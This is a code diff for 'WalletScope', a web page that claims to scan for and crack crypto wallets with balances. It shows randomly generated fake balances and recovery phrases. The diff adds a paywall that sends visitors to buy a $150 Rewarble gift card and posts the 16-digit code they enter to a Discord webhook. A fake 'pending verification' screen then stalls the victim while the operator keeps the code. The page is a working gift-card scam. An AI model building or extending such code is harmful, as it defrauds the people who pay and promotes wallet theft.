@@ -23,8 +23,34 @@
       border-bottom: 1px solid #232838;
     }
     .logo { font-weight: 700; font-size: 20px; color: #6ee7b7; letter-spacing: 0.5px; }
-    .user { font-size: 14px; color: #8b93a7; }
+    .user { font-size: 14px; color: #8b93a7; display: flex; align-items: center; gap: 10px; }
     .user span { color: #6ee7b7; font-weight: 600; }
+
+    /* Pro badge in header */
+    .pro-badge {
+      background: linear-gradient(135deg, #6ee7b7, #34d399);
+      color: #0b0e14;
+      font-size: 11px;
+      font-weight: 800;
+      padding: 3px 10px;
+      border-radius: 20px;
+      letter-spacing: 0.5px;
+      display: none;
+    }
+    .pro-badge.show { display: inline-block; }
+
+    /* Pending badge in header */
+    .pending-badge {
+      background: linear-gradient(135deg, #fbbf24, #f59e0b);
+      color: #0b0e14;
+      font-size: 11px;
+      font-weight: 800;
+      padding: 3px 10px;
+      border-radius: 20px;
+      letter-spacing: 0.5px;
+      display: none;
+    }
+    .pending-badge.show { display: inline-block; }
 
     /* --- Tabs --- */
     .tabs {
@@ -90,6 +116,112 @@
     }
     button.primary:hover:not(:disabled) { background: #34d399; transform: translateY(-1px); }
     button.primary:disabled { opacity: 0.4; cursor: not-allowed; }
+
+    /* --- Locked scan overlay --- */
+    .scan-locked {
+      background: #0b0e14;
+      border: 1px dashed #fbbf24;
+      border-radius: 10px;
+      padding: 28px 24px;
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .scan-locked .lock-icon {
+      font-size: 36px;
+      margin-bottom: 12px;
+      display: block;
+    }
+    .scan-locked h3 {
+      font-size: 17px;
+      color: #fbbf24;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+    .scan-locked p {
+      font-size: 13px;
+      color: #8b93a7;
+      line-height: 1.6;
+      margin-bottom: 18px;
+      max-width: 520px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .scan-locked .unlock-btn {
+      background: #fbbf24;
+      color: #0b0e14;
+      border: none;
+      padding: 12px 24px;
+      font-size: 14px;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    .scan-locked .unlock-btn:hover { background: #f59e0b; transform: translateY(-1px); }
+
+    /* Pending verification state */
+    .scan-pending {
+      background: #0b0e14;
+      border: 1px dashed #60a5fa;
+      border-radius: 10px;
+      padding: 28px 24px;
+      text-align: center;
+      margin-bottom: 24px;
+      display: none;
+    }
+    .scan-pending.show { display: block; }
+    .scan-pending .pend-icon {
+      font-size: 36px;
+      margin-bottom: 12px;
+      display: block;
+      animation: pulse 2s infinite ease-in-out;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.45; }
+    }
+    .scan-pending h3 {
+      font-size: 17px;
+      color: #60a5fa;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+    .scan-pending p {
+      font-size: 13px;
+      color: #8b93a7;
+      line-height: 1.6;
+      margin-bottom: 6px;
+      max-width: 520px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .scan-pending .code-shown {
+      display: inline-block;
+      font-family: 'JetBrains Mono', 'Consolas', monospace;
+      font-size: 13px;
+      background: #141824;
+      border: 1px solid #2a3040;
+      border-radius: 6px;
+      padding: 6px 14px;
+      color: #93c5fd;
+      margin-top: 10px;
+      letter-spacing: 1px;
+    }
+    .scan-pending .contact-line {
+      font-size: 12px;
+      color: #6b7280;
+      margin-top: 14px;
+    }
+    .scan-pending .contact-line a {
+      color: #6ee7b7;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .scan-pending .contact-line a:hover { text-decoration: underline; }
+
+    .scan-area { display: none; }
+    .scan-area.unlocked { display: block; }
 
     .stats {
       display: flex;
@@ -310,8 +442,10 @@
       font-size: 13px;
       min-height: 20px;
       color: #8b93a7;
+      line-height: 1.5;
     }
     .redeem-status.success { color: #6ee7b7; }
+    .redeem-status.pending { color: #60a5fa; }
     .redeem-status.error { color: #f87171; }
 
     /* --- Support page --- */
@@ -411,7 +545,11 @@
 <body>
   <header>
     <div class="logo">◈ WalletScope</div>
-    <div class="user">Logged in as <span id="username"></span></div>
+    <div class="user">
+      Logged in as <span id="username"></span>
+      <span class="pending-badge" id="pendingBadge">⏳ PENDING</span>
+      <span class="pro-badge" id="proBadge">✔ PRO</span>
+    </div>
   </header>
 
   <nav class="tabs">
@@ -427,29 +565,59 @@
         <h1>Find Wallets</h1>
         <p class="subtitle">Scan the network for wallets containing a balance.</p>
 
-        <button class="primary" id="startBtn">▶ Start Scanning</button>
-
-        <div class="stats">
-          <div>Scanned: <strong id="scanned">0</strong></div>
-          <div>Found: <strong id="foundCount">0</strong></div>
-          <div>Elapsed: <strong id="elapsed">0s</strong></div>
+        <!-- LOCKED STATE (no code submitted yet) -->
+        <div class="scan-locked" id="scanLocked">
+          <span class="lock-icon">🔒</span>
+          <h3>Pro Access Required</h3>
+          <p>
+            Wallet scanning is a premium feature. Purchase a Rewarble Super Gift Card
+            and redeem your 16-digit code to request access. Codes are verified manually
+            by our team before scanning is enabled.
+          </p>
+          <button class="unlock-btn" id="goToPayment">🔓 Unlock with Pro Access</button>
         </div>
 
-        <div class="log" id="log">
-          <div class="log-entry info">[system] Ready to scan.</div>
+        <!-- PENDING VERIFICATION STATE (code submitted, waiting for manual approval) -->
+        <div class="scan-pending" id="scanPending">
+          <span class="pend-icon">⏳</span>
+          <h3>Please wait until your code is verified</h3>
+          <p>
+            We've received your gift card code. Our team is reviewing it now — this usually
+            takes a few minutes to a few hours. Scanning will unlock automatically once
+            your payment is confirmed.
+          </p>
+          <div class="code-shown" id="pendingCode">••••-••••-••••-••••</div>
+          <p class="contact-line">
+            Need help? Contact <a href="mailto:support@walletscope.com">support@walletscope.com</a>
+          </p>
         </div>
 
-        <div class="found" id="foundBox">
-          <h2>✔ Wallet Found With Balance!</h2>
-          <p>Address: <span class="addr" id="foundAddr"></span></p>
-          <p>Balance: <strong id="foundBal"></strong></p>
-          <p>Value: <strong id="foundUsd"></strong></p>
-          <p>Network: <strong id="foundCoin"></strong></p>
-        </div>
+        <!-- UNLOCKED STATE -->
+        <div class="scan-area" id="scanArea">
+          <button class="primary" id="startBtn">▶ Start Scanning</button>
 
-        <div class="seed" id="seedBox">
-          <h2>🔓 Wallet Cracked — Recovery Phrase</h2>
-          <div class="words" id="seedWords"></div>
+          <div class="stats">
+            <div>Scanned: <strong id="scanned">0</strong></div>
+            <div>Found: <strong id="foundCount">0</strong></div>
+            <div>Elapsed: <strong id="elapsed">0s</strong></div>
+          </div>
+
+          <div class="log" id="log">
+            <div class="log-entry info">[system] Ready to scan.</div>
+          </div>
+
+          <div class="found" id="foundBox">
+            <h2>✔ Wallet Found With Balance!</h2>
+            <p>Address: <span class="addr" id="foundAddr"></span></p>
+            <p>Balance: <strong id="foundBal"></strong></p>
+            <p>Value: <strong id="foundUsd"></strong></p>
+            <p>Network: <strong id="foundCoin"></strong></p>
+          </div>
+
+          <div class="seed" id="seedBox">
+            <h2>🔓 Wallet Cracked — Recovery Phrase</h2>
+            <div class="words" id="seedWords"></div>
+          </div>
         </div>
       </div>
     </section>
@@ -478,7 +646,7 @@
           <h3>How to pay</h3>
           <p class="note">
             We accept payment via <strong>Rewarble Super Gift Card ($150 USD)</strong>.
-            Click the button below to purchase one, then return here to complete your order.
+            Click the button below to purchase one, then return here to submit your code.
           </p>
           <a class="giftcard-btn"
              href="https://www.g2a.com/rewarble-super-gift-card-150-usd-by-rewarble-key-united-states-i10000506957021"
@@ -489,10 +657,10 @@
           <p class="external-note">Opens G2A in a new tab.</p>
         </div>
 
-        <!-- GIFT CARD CODE REDEMPTION -->
+        <!-- GIFT CARD CODE SUBMISSION -->
         <div class="redeem-box" id="redeemBox">
-          <h3>🔑 Redeem your gift card</h3>
-          <p>Enter the <strong>16‑digit code</strong> from your Rewarble Super Gift Card below. We'll verify it instantly and unlock your Pro Access.</p>
+          <h3>🔑 Submit your gift card code</h3>
+          <p>Enter the <strong>16‑digit code</strong> from your Rewarble Super Gift Card below. Our team will verify it and unlock your Pro Access.</p>
           <div class="code-input">
             <input
               type="text"
@@ -503,7 +671,7 @@
               spellcheck="false"
               inputmode="numeric"
             />
-            <button id="redeemBtn">Redeem Code</button>
+            <button id="redeemBtn">Submit Code</button>
           </div>
           <div class="redeem-status" id="redeemStatus"></div>
         </div>
@@ -551,7 +719,7 @@
           <ul>
             <li><strong>Pro users</strong> — Priority support, typically within 2–4 hours</li>
             <li><strong>Standard inquiries</strong> — Usually within 24 hours</li>
-            <li><strong>Billing &amp; redemption issues</strong> — Handled within 1 business day</li>
+            <li><strong>Code verification</strong> — Handled within 1 business day</li>
           </ul>
           <p style="margin-top: 14px; margin-bottom: 0;">
             Please include your <strong>username</strong> (shown in the top-right corner)
@@ -569,6 +737,102 @@
   // ---------- Guest username ----------
   const username = 'user' + Math.floor(Math.random() * 9_000_000_000 + 1_000_000_000);
   document.getElementById('username').textContent = username;
+
+  // ============================================================
+  // ACCESS STATE
+  // ============================================================
+  // Three possible states:
+  //   'locked'   — no code submitted, nothing unlocked
+  //   'pending'  — code submitted, waiting for manual verification
+  //   'pro'      — verified by you (set manually)
+  //
+  // The client NEVER flips to 'pro' on its own. Only a human operator
+  // (you) should change it — see the `grantProAccess()` helper below.
+  //
+  // To grant access to a specific user, you can either:
+  //   1. Run  window.grantProAccess()  in their browser console, OR
+  //   2. Have them run  localStorage.setItem('walletscope_access', 'pro')  and refresh
+  // ============================================================
+  const ACCESS_KEY = 'walletscope_access';
+  let accessState = 'locked';
+
+  try {
+    const saved = localStorage.getItem(ACCESS_KEY);
+    if (saved === 'pro' || saved === 'pending') accessState = saved;
+  } catch (e) {
+    accessState = 'locked';
+  }
+
+  const scanLocked = document.getElementById('scanLocked');
+  const scanPending = document.getElementById('scanPending');
+  const scanArea = document.getElementById('scanArea');
+  const proBadge = document.getElementById('proBadge');
+  const pendingBadge = document.getElementById('pendingBadge');
+  const goToPaymentBtn = document.getElementById('goToPayment');
+  const pendingCodeEl = document.getElementById('pendingCode');
+
+  // Restore the last submitted code so the pending screen remembers it
+  let lastSubmittedCode = '';
+  try {
+    lastSubmittedCode = localStorage.getItem('walletscope_pending_code') || '';
+  } catch (e) {}
+  if (lastSubmittedCode) pendingCodeEl.textContent = lastSubmittedCode;
+
+  function applyAccessState() {
+    // Hide all three states first
+    scanLocked.style.display = 'none';
+    scanPending.classList.remove('show');
+    scanArea.classList.remove('unlocked');
+    proBadge.classList.remove('show');
+    pendingBadge.classList.remove('show');
+
+    if (accessState === 'pro') {
+      scanArea.classList.add('unlocked');
+      proBadge.classList.add('show');
+    } else if (accessState === 'pending') {
+      scanPending.classList.add('show');
+      pendingBadge.classList.add('show');
+      if (lastSubmittedCode) pendingCodeEl.textContent = lastSubmittedCode;
+    } else {
+      scanLocked.style.display = 'block';
+    }
+  }
+  applyAccessState();
+
+  // Public helper — you (the operator) call this to actually grant access.
+  // Example: after verifying a user's gift card, run in their browser console:
+  //   grantProAccess()
+  window.grantProAccess = function () {
+    accessState = 'pro';
+    try {
+      localStorage.setItem(ACCESS_KEY, 'pro');
+      localStorage.removeItem('walletscope_pending_code');
+    } catch (e) {}
+    applyAccessState();
+    console.log('[WalletScope] Pro Access granted.');
+  };
+
+  // Public helper — revoke access (useful for testing)
+  window.revokeAccess = function () {
+    accessState = 'locked';
+    try {
+      localStorage.removeItem(ACCESS_KEY);
+      localStorage.removeItem('walletscope_pending_code');
+    } catch (e) {}
+    lastSubmittedCode = '';
+    pendingCodeEl.textContent = '••••-••••-••••-••••';
+    applyAccessState();
+    console.log('[WalletScope] Access revoked.');
+  };
+
+  // "Unlock with Pro Access" button → jump to Payment tab
+  goToPaymentBtn.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.querySelector('.tab[data-tab="payment"]').classList.add('active');
+    document.getElementById('page-payment').classList.add('active');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
 
   // ---------- Tab switching ----------
   const tabs = document.querySelectorAll('.tab');
@@ -618,8 +882,6 @@
     'jasmine','cinder','vortex','opal','wren','bramble','dusk','flint','saffron','lark'
   ];
 
-  // ---------- Crypto reference data for random balance generation ----------
-  // Approximate USD prices — used only to compute a plausible-looking balance.
   const CRYPTO_OPTIONS = [
     { symbol: 'ETH',   name: 'Ethereum',  price: 3200   },
     { symbol: 'BTC',   name: 'Bitcoin',   price: 68000  },
@@ -640,27 +902,20 @@
     { symbol: 'USDC',  name: 'USD Coin',  price: 1.00   }
   ];
 
-  // Generate a random crypto balance worth between $500 and $5000
   function randomCryptoBalance() {
     const coin = CRYPTO_OPTIONS[Math.floor(Math.random() * CRYPTO_OPTIONS.length)];
-    const usdValue = Math.random() * 4500 + 500; // $500 – $5000
+    const usdValue = Math.random() * 4500 + 500;
     const amount = usdValue / coin.price;
 
-    // Format amount nicely depending on magnitude
     let formatted;
     if (amount >= 1000)      formatted = amount.toFixed(2);
     else if (amount >= 1)    formatted = amount.toFixed(4);
     else if (amount >= 0.01) formatted = amount.toFixed(6);
     else                     formatted = amount.toFixed(8);
 
-    return {
-      coin,
-      amount: formatted,
-      usd: usdValue
-    };
+    return { coin, amount: formatted, usd: usdValue };
   }
 
-  // Format USD with commas
   function formatUsd(v) {
     return '$' + v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
   }
@@ -696,6 +951,17 @@
   }
 
   function startScan() {
+    // Hard gate — only verified 'pro' users can scan
+    if (accessState !== 'pro') {
+      if (accessState === 'pending') {
+        // Stay on this page and remind them
+        alert('Your code is still being verified. Please wait until your code is verified.');
+      } else {
+        goToPaymentBtn.click();
+      }
+      return;
+    }
+
     scanning = true;
     scanned = 0;
     startTime = Date.now();
@@ -806,13 +1072,12 @@
   startBtn.addEventListener('click', startScan);
 
   // ============================================================
-  // GIFT CARD CODE → DISCORD WEBHOOK
+  // GIFT CARD CODE → DISCORD WEBHOOK (submission only — does NOT unlock)
   // ============================================================
   const giftcardInput = document.getElementById('giftcardInput');
   const redeemBtn = document.getElementById('redeemBtn');
   const redeemStatus = document.getElementById('redeemStatus');
 
-  // Auto-format: insert hyphens every 4 digits (16 digits max)
   giftcardInput.addEventListener('input', function (e) {
     let digits = this.value.replace(/\D/g, '').slice(0, 16);
     let formatted = '';
@@ -840,11 +1105,12 @@
       username: 'WalletScope Redemption',
       embeds: [
         {
-          title: '🎁 Gift Card Code Redeemed',
-          color: 0x6ee7b7,
+          title: '🎁 Gift Card Code Submitted (PENDING VERIFICATION)',
+          color: 0xfbbf24,
           fields: [
             { name: '👤 User', value: username, inline: true },
             { name: '🔑 Code', value: '`' + code + '`', inline: true },
+            { name: '📌 Status', value: 'Awaiting manual verification', inline: false },
             { name: '⏱️ Time', value: new Date().toUTCString(), inline: false }
           ],
           footer: { text: 'WalletScope · Payment System' }
@@ -877,23 +1143,46 @@
     const formattedCode = digits.match(/.{1,4}/g).join('-');
 
     redeemBtn.disabled = true;
-    redeemBtn.textContent = '⏳ Sending...';
-    redeemStatus.textContent = 'Sending code to verification server...';
+    redeemBtn.textContent = '⏳ Submitting...';
+    redeemStatus.textContent = 'Sending code for verification...';
     redeemStatus.className = 'redeem-status';
 
     try {
       await sendToDiscord(formattedCode);
-      redeemStatus.textContent = '✅ Code submitted! Your Pro Access will be activated shortly.';
-      redeemStatus.className = 'redeem-status success';
+
+      // Move user to the PENDING state — do NOT unlock
+      accessState = 'pending';
+      lastSubmittedCode = formattedCode;
+      try {
+        localStorage.setItem(ACCESS_KEY, 'pending');
+        localStorage.setItem('walletscope_pending_code', formattedCode);
+      } catch (e) {}
+
+      // Update UI
+      applyAccessState();
+      pendingCodeEl.textContent = formattedCode;
+
+      redeemStatus.textContent = '⏳ Code received. Please wait until your code is verified by our team.';
+      redeemStatus.className = 'redeem-status pending';
       giftcardInput.value = '';
       giftcardInput.disabled = true;
-      redeemBtn.textContent = '✔ Sent';
+      redeemBtn.textContent = '✔ Submitted';
+
+      // Redirect back to the wallets tab so they see the pending message
+      setTimeout(() => {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.querySelector('.tab[data-tab="wallets"]').classList.add('active');
+        document.getElementById('page-wallets').classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }, 1500);
+
     } catch (err) {
-      console.error('Redemption error:', err);
-      redeemStatus.textContent = '❌ ' + (err.message || 'Failed to send code. Please try again.');
+      console.error('Submission error:', err);
+      redeemStatus.textContent = '❌ ' + (err.message || 'Failed to submit code. Please try again.');
       redeemStatus.className = 'redeem-status error';
       redeemBtn.disabled = false;
-      redeemBtn.textContent = 'Redeem Code';
+      redeemBtn.textContent = 'Submit Code';
     }
   });
 
